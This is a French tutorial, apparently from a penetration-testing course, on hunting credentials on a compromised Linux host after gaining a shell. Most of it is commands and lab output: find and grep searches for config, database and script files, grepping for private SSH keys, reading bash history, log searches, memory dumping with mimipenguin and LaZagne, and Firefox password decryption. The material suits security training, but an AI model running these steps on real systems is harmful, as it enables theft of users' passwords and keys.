# Recherche d'informations d'identification dans Linux

La recherche d'informations d'identification est l'une des premières étapes une fois que nous avons accès au système. Ces fruits à portée de main peuvent nous donner des privilèges élevés en quelques secondes ou minutes. Entre autres choses, cela fait partie du processus d'escalade des privilèges locaux que nous aborderons ici. Cependant, il est important de noter ici que nous sommes loin de couvrir toutes les situations possibles et donc de nous concentrer sur les différentes approches.

On peut imaginer avoir réussi à accéder à un système via une application web vulnérable et avoir ainsi obtenu un reverse shell par exemple. Par conséquent, pour augmenter nos privilèges le plus efficacement possible, nous pouvons rechercher des mots de passe ou même des informations d'identification complètes que nous pouvons utiliser pour nous connecter à notre cible. Il existe plusieurs sources qui peuvent nous fournir des informations d'identification que nous classons en quatre catégories. Ceux-ci incluent, mais ne sont pas limités à :
| `Files` | `History` | `Memory` | `Key-Rings` |
| --- | --- | --- | --- |
| Configs | Logs | Cache | Browser stored credentials |
| Databases | Command-line History | In-memory Processing |  |
| Notes |  |  |  |
| Scripts |  |  |  |
| Source codes |  |  |  |
| Cronjobs |  |  |  |
| SSH Keys |  |  |  |

L'énumération de toutes ces catégories nous permettra d'augmenter la probabilité de réussir à trouver avec une certaine facilité les informations d'identification des utilisateurs existants sur le système. Il existe d'innombrables situations différentes dans lesquelles nous verrons toujours des résultats différents. Par conséquent, nous devons adapter notre approche aux circonstances de l'environnement et garder à l'esprit la situation dans son ensemble. Avant tout, il est crucial de garder à l'esprit le fonctionnement du système, son objectif, sa raison d'être et son rôle dans la logique métier et le réseau global. Par exemple, supposons qu'il s'agisse d'un serveur de base de données isolé. Dans ce cas, on n'y trouvera pas forcément des utilisateurs normaux puisqu'il s'agit d'une interface sensible dans la gestion des données à laquelle seules quelques personnes ont accès.

## Fichiers
Un principe fondamental de Linux est que tout est un fichier. Par conséquent, il est crucial de garder ce concept à l'esprit et de rechercher, trouver et filtrer les fichiers appropriés en fonction de nos exigences. Nous devons rechercher, trouver et inspecter plusieurs catégories de fichiers un par un. Ces catégories sont les suivantes :

|  |  |  |
| --- | --- | --- |
| Configuration files | Databases | Notes |
| Scripts | Cronjobs | SSH keys |

Les fichiers de configuration sont au cœur de la fonctionnalité des services sur les distributions Linux. Souvent, ils contiennent même des informations d'identification que nous pourrons lire. Leur perspicacité nous permet également de comprendre précisément le fonctionnement du service et ses exigences. Habituellement, les fichiers de configuration sont marqués avec les trois extensions de fichier suivantes (.config, .conf, .cnf). Cependant, ces fichiers de configuration ou les fichiers d'extension associés peuvent être renommés, ce qui signifie que ces extensions de fichiers ne sont pas nécessairement requises. De plus, même lors de la recompilation d'un service, le nom de fichier requis pour la configuration de base peut être modifié, ce qui aurait le même effet. Cependant, il s'agit d'un cas rare que nous ne rencontrerons pas souvent, mais cette possibilité ne doit pas être exclue de notre recherche.

La partie la plus cruciale de toute énumération de système est d'en obtenir une vue d'ensemble. Par conséquent, la première étape devrait être de trouver tous les fichiers de configuration possibles sur le système, que nous pourrons ensuite examiner et analyser individuellement plus en détail. Il existe de nombreuses méthodes pour trouver ces fichiers de configuration, et avec la méthode suivante, nous verrons que nous avons réduit notre recherche à ces trois extensions de fichiers.

```
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```
En option, nous pouvons enregistrer le résultat dans un fichier texte et l'utiliser pour examiner les fichiers individuels les uns après les autres. Une autre option consiste à exécuter l'analyse directement pour chaque fichier trouvé avec l'extension de fichier spécifiée et à afficher le contenu. Dans cet exemple, nous recherchons trois mots (utilisateur, mot de passe, pass) dans chaque fichier avec l'extension de fichier .cnf.
```
ry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
```
Nous pouvons également appliquer cette recherche simple aux autres extensions de fichiers. De plus, nous pouvons appliquer ce type de recherche aux bases de données stockées dans des fichiers avec différentes extensions de fichiers, et nous pouvons ensuite les lire.

```
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
```

En fonction de l'environnement dans lequel nous nous trouvons et de l'objectif de l'hôte sur lequel nous nous trouvons, nous pouvons souvent trouver des notes sur des processus spécifiques sur le système. Ceux-ci incluent souvent des listes de nombreux points d'accès différents ou même leurs informations d'identification. Cependant, il est souvent difficile de trouver des notes immédiatement si elles sont stockées quelque part sur le système et non sur le bureau ou dans ses sous-dossiers. En effet, ils peuvent porter n'importe quel nom et n'ont pas besoin d'avoir une extension de fichier spécifique, telle que .txt. Par conséquent, dans ce cas, nous devons rechercher des fichiers comprenant l'extension de fichier .txt et des fichiers qui n'ont aucune extension de fichier.

```
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
...SNIP...
```

Les scripts sont des fichiers qui contiennent souvent des informations et des processus très sensibles. Ceux-ci contiennent entre autres des informations d'identification nécessaires pour pouvoir appeler et exécuter automatiquement les processus. Sinon, l'administrateur ou le développeur devrait saisir le mot de passe correspondant à chaque appel du script ou du programme compilé.

```
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
...SNIP...
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```

Les cronjobs sont des exécutions indépendantes de commandes, programmes, scripts. Celles-ci sont divisées en exécutions à l'échelle du système (/etc/crontab) et en exécutions dépendantes de l'utilisateur. Certaines applications et certains scripts nécessitent des informations d'identification pour s'exécuter et sont donc incorrectement saisis dans les cronjobs. De plus, certaines zones sont divisées en différentes plages horaires (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, /etc/cron.weekly). Les scripts et fichiers utilisés par cron peuvent également être trouvés dans /etc/cron.d/ pour les distributions basées sur Debian.

```
cry0l1t3@unixclient:~$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```


```
cry0l1t3@unixclient:~$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
...SNIP...
```

## Clés SSH
Les clés SSH peuvent être considérées comme des "cartes d'accès" pour le protocole SSH utilisé pour le mécanisme d'authentification à clé publique. Un fichier est généré pour le client (Clé privée) et un correspondant pour le serveur (Clé publique). Cependant, ce ne sont pas les mêmes, donc connaître la clé publique est insuffisant pour trouver une clé privée. La clé publique peut vérifier les signatures générées par la clé SSH privée et permet ainsi la connexion automatique au serveur. Même si des personnes non autorisées obtiennent la clé publique, il est presque impossible de calculer la clé privée correspondante à partir de celle-ci. Lors de la connexion au serveur à l'aide de la clé SSH privée, le serveur vérifie si la clé privée est valide et permet au client de se connecter en conséquence. Ainsi, les mots de passe ne sont plus nécessaires pour se connecter via SSH.

Étant donné que les clés SSH peuvent être nommées arbitrairement, nous ne pouvons pas les rechercher pour des noms spécifiques. Cependant, leur format nous permet de les identifier de manière unique car, qu'il s'agisse de clé publique ou de clé privée, les deux ont des premières lignes uniques pour les distinguer.
```
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

OU

```
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
```

## Historique
Tous les fichiers d'historique fournissent des informations cruciales sur le cours actuel et passé/historique des processus. Nous nous intéressons aux fichiers qui stockent l'historique des commandes des utilisateurs et aux journaux qui stockent des informations sur les processus système.

Dans l'historique des commandes saisies sur les distributions Linux qui utilisent Bash comme shell standard, on retrouve les fichiers associés dans .bash_history. Néanmoins, d'autres fichiers comme .bashrc ou .bash_profile peuvent contenir des informations importantes.

```
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

## LOGS
Un concept essentiel des systèmes Linux est les fichiers journaux qui sont stockés dans des fichiers texte. De nombreux programmes, en particulier tous les services et le système lui-même, écrivent de tels fichiers. En eux, nous trouvons des erreurs système, détectons des problèmes concernant les services ou suivons ce que le système fait en arrière-plan. L'intégralité des fichiers journaux peut être divisée en quatre catégories :

| Application Logs | Event Logs | Service Logs | System Logs |
| --- | --- | --- | --- |

De nombreux journaux différents existent sur le système. Celles-ci peuvent varier en fonction des applications installées, mais voici quelques-unes des plus importantes :

| Fichier journal | Descriptif |
| --- | --- |
| `/var/log/messages` | Journaux d'activité système génériques. |
| `/var/log/syslog` | Journaux d'activité système génériques. |
| `/var/log/auth.log` | (Debian) Tous les journaux liés à l'authentification. |
| `/var/log/sécurisé` | (RedHat/CentOS) Tous les journaux liés à l'authentification. |
| `/var/log/boot.log` | Informations de démarrage. |
| `/var/log/dmesg` | Informations et journaux liés au matériel et aux pilotes. |
| `/var/log/kern.log` | Avertissements, erreurs et journaux liés au noyau. |
| `/var/log/faillog` | Tentatives de connexion infructueuses. |
| `/var/log/cron` | Informations relatives aux tâches cron. |
| `/var/log/mail.log` | Tous les journaux liés au serveur de messagerie. |
| `/var/log/httpd` | Tous les journaux liés à Apache. |
| `/var/log/mysqld.log` | Tous les journaux liés au serveur MySQL. |

Couvrir en détail l'analyse de ces fichiers journaux serait inefficace dans ce cas. Donc, à ce stade, nous devons nous familiariser avec les journaux individuels, en les examinant d'abord manuellement et en comprenant leurs formats. Cependant, voici quelques chaînes que nous pouvons utiliser pour trouver du contenu intéressant dans les journaux :
```
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1

...SNIP...
```

## Mémoire et cache
De nombreuses applications et processus fonctionnent avec les informations d'identification nécessaires à l'authentification et les stockent en mémoire ou dans des fichiers afin qu'ils puissent être réutilisés. Par exemple, il peut s'agir des informations d'identification requises par le système pour les utilisateurs connectés. Un autre exemple est les informations d'identification stockées dans les navigateurs, qui peuvent également être lues. Afin de récupérer ce type d'informations à partir des distributions Linux, il existe un outil appelé mimipenguin qui facilite l'ensemble du processus. Cependant, cet outil nécessite des autorisations d'administrateur/racine.

### Mémoire - Mimipingouin
```
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
```

Un outil encore plus puissant que nous pouvons utiliser et qui a été mentionné plus tôt dans la section Credential Hunting in Windows est LaZagne. Cet outil nous permet d'accéder à beaucoup plus de ressources et d'extraire les informations d'identification. Les mots de passe et les hachages que nous pouvons obtenir proviennent des sources suivantes, mais ne sont pas limités à :
|  |  |  |
| --- | --- | --- |
| Wifi | Wpa_supplicant | Libsecret | Kwallet |
| Chromium-based | CLI | Mozilla | Thunderbird |
| Git | Env_variable | Grub | Fstab |
| AWS | Filezilla | Gftp | SSH |
| Apache | Shadow | Docker | KeePass |
| Mimipy | Sessions | Keyrings |  |

Par exemple, les porte-clés sont utilisés pour le stockage sécurisé et la gestion des mots de passe sur les distributions Linux. Les mots de passe sont stockés cryptés et protégés par un mot de passe principal. Il s'agit d'un gestionnaire de mots de passe basé sur le système d'exploitation, dont nous parlerons plus tard dans une autre section. De cette façon, nous n'avons pas besoin de nous souvenir de chaque mot de passe et pouvons enregistrer des entrées de mot de passe répétées.

## Memory - LaZagne
```
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```

## Navigateurs
Les navigateurs stockent les mots de passe enregistrés par l'utilisateur sous une forme cryptée localement sur le système pour être réutilisés. Par exemple, le navigateur Mozilla Firefox stocke les informations d'identification chiffrées dans un dossier caché pour l'utilisateur respectif. Ceux-ci incluent souvent les noms de champs associés, les URL et d'autres informations précieuses.

Par exemple, lorsque nous stockons les informations d'identification d'une page Web dans le navigateur Firefox, elles sont chiffrées et stockées dans logins.json sur le système. Cependant, cela ne signifie pas qu'ils y sont en sécurité. De nombreux employés stockent ces données de connexion dans leur navigateur sans se douter qu'elles peuvent facilement être déchiffrées et utilisées contre l'entreprise.

### Informations d'identification stockées dans Firefox
```
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

L'outil Firefox Decrypt est excellent pour décrypter ces informations d'identification et est mis à jour régulièrement. Il nécessite Python 3.9 pour exécuter la dernière version. Sinon, Firefox Decrypt 0.7.0 avec Python 2 doit être utilisé.

Déchiffrer les informations d'identification de Firefox

```
dsgsec@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

Alternativement, LaZagne peut également renvoyer des résultats si l'utilisateur a utilisé le navigateur pris en charge.

```
cry0l1t3@unixclient:~$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```